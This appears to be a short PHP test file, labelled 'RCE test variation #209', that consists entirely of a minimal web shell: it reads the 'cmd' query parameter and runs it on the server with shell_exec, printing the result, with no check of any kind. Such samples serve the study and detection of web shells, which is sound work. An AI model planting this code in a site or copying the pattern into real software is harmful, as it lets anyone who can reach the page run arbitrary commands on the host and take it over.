<?php
// RCE test variation #209
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>